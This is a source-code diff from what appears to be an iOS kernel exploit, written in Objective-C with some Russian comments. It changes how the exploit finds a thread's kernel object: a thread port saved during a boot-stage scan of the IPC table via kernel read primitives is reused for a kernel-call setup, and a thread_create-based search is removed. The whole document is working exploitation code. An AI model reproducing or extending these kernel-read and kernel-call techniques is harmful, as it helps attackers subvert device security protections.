@@ -2367,6 +2367,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                          ? kp_untag_ptr(kpSMRDecode(tbT)) : kp_untag_ptr(tbT);
                             kpNote(r, [NSString stringWithFormat:@"  [BOOT] isTable=%#llx", (unsigned long long)isT]);
                             uint64_t thK = 0;
+                            mach_port_t savedThPort = MACH_PORT_NULL;
                             if (isT && tkr == KERN_SUCCESS && threads && tcount > 0) {
                                 // берём первый thread-порт и резолвим через isTable
                                 mach_port_t tp = threads[0];
@@ -2385,7 +2386,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                             // ищем task внутри tro
                                             for (uint32_t o2 = 0; o2 < 0x80; o2 += 8) {
                                                 if (kp_untag_ptr(early_kread64(troC + o2)) == tkT) {
-                                                    thK = cand;
+                                                    thK = cand; savedThPort = tp;
                                                     kpNote(r, [NSString stringWithFormat:@"  [BOOT] ★ thread*=%#llx kobj+%x tro@+x%x tro+0x%x=TASK",
                                                               (unsigned long long)cand, ko, o, o2]);
                                                     break;
@@ -2430,26 +2431,9 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                     if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }
                                     kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", m]);
                                 };
-                                mach_port_t hp = MACH_PORT_NULL;
-                                kern_return_t ckr = thread_create(mach_task_self(), &hp);
-                                klog([NSString stringWithFormat:@"thread_create kr=0x%x port=0x%x", ckr, hp]);
-                                uint64_t hK = 0;
-                                if (ckr == KERN_SUCCESS && hp && isT) {
-                                    uint64_t heVA = isT + (uint64_t)sizeof_ipc_entry * (hp >> 8);
-                                    uint64_t hie = kp_untag_ptr(early_kread64(heVA + off_ipc_entry_ie_object));
-                                    if (kpLooksLikeKernelPointer(hie)) {
-                                        for (uint32_t ko = 0x18; ko <= 0x60 && !hK; ko += 8) {
-                                            uint64_t cand = kp_untag_ptr(early_kread64(hie + ko));
-                                            if (!kpLooksLikeKernelPointer(cand)) continue;
-                                            for (uint32_t o = 0; o < 0x500; o += 8) {
-                                                uint64_t troC = kp_untag_ptr(early_kread64(cand + o));
-                                                if (kpLooksLikeKernelPointer(troC) &&
-                                                    kp_untag_ptr(early_kread64(troC + 0x48)) == tkT) { hK = cand; break; }
-                                            }
-                                        }
-                                    }
-                                }
-                                klog([NSString stringWithFormat:@"thread*=%#llx", (unsigned long long)hK]);
+                                mach_port_t hp = savedThPort;
+                                uint64_t hK = thK;
+                                klog([NSString stringWithFormat:@"use BOOT pair port=0x%x thread*=%#llx", hp, (unsigned long long)hK]);
                                 if (hK && hp) {
                                     uint64_t oVA = hK + 0xC0;
                                     uint64_t o0 = early_kread64(oVA);
